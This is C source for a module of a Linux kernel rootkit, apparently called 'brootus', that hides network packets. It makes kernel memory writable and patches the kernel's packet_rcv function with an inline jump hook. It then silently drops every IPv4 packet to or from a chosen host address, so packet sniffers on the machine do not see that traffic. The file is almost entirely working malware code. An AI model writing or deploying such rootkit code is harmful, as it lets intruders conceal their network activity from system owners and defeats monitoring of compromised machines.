/*
 * This file provides all the functionality needed for hiding packets.
 *
 */

#include "include.h"
#include "main.h"

#include <net/ip.h>
#include <linux/inet.h>

unsigned int host_ip = 0;
spinlock_t pack_lock;

#define JUMP_CODE_SIZE 6
#define JUMP_CODE_ADDR_OFFSET 1

char jump_code[JUMP_CODE_SIZE] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
unsigned int* jump_addr = (unsigned int*) (jump_code + JUMP_CODE_ADDR_OFFSET);
int hide(struct sk_buff *);

//Variable for packet_rcv function
char original_code_packet_rcv[JUMP_CODE_SIZE];
int original_pte_packet_rcv;
int brootus_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev);;

void hook_packet_rcv(void)
{
	spin_lock(&pack_lock);
	*jump_addr = (unsigned int) brootus_packet_rcv;
	memcpy(original_code_packet_rcv, fn_packet_rcv, JUMP_CODE_SIZE);
	memcpy(fn_packet_rcv, jump_code, JUMP_CODE_SIZE);
	spin_unlock(&pack_lock);
}

void restore_packet_rcv(void)
{
	spin_lock(&pack_lock);
	memcpy(fn_packet_rcv, original_code_packet_rcv, JUMP_CODE_SIZE); //TODO
	spin_unlock(&pack_lock);
}

int brootus_packet_rcv(struct sk_buff* skb, struct net_device* dev, struct packet_type* pt, struct net_device* orig_dev)
{
	int ret;
	if(hide(skb)) return 0;

	restore_packet_rcv();
	ret = fn_packet_rcv(skb,dev,pt,orig_dev);// TODO
	hook_packet_rcv();
	return ret;	
}

/* Check if we need to hide this perticular packet */
int hide(struct sk_buff *skb)
{
	//if(!skb) return 0; // Check for NULL
	//if(!(skb->nh.iph)) return 0;// Check for NULL
	
	//if(skb->nh.iph->saddr == host_ip) //TODO check if host_ip is in net format
//	{	
//		return 1;
//	}
	
	if (skb->protocol == htons(ETH_P_IP)) {
  		  // Extract the IP header
	    	struct iphdr* iph = (struct iphdr*) skb_network_header(skb);

   		 // Check if the blocked host's IP is involved
	    if (iph->saddr == host_ip || iph->daddr == host_ip){
      		return 1;
    		}
	}	
	return 0;
}


/* hooks all functions needed to hide packets */
void hook_packets(char *ipv4_addr)
{
        ROOTKIT_DEBUG("Hooking the appropriate functions for hiding packets...\n");
	
	u8 dst[4];
	int ret = in4_pton(ipv4_addr, -1, dst, -1, NULL); // Use the same function for convert into integer
	host_ip = *(unsigned int *)dst; 

	original_pte_packet_rcv = set_addr_rw((unsigned long) fn_packet_rcv); 
	hook_packet_rcv();	
}

/* unhooks all functions */
void unhook_packets(void)
{
        ROOTKIT_DEBUG("Unhooking everything... bye!\n");
	restore_packet_rcv();
	set_pte_permissions((unsigned int) fn_packet_rcv, original_pte_packet_rcv);
}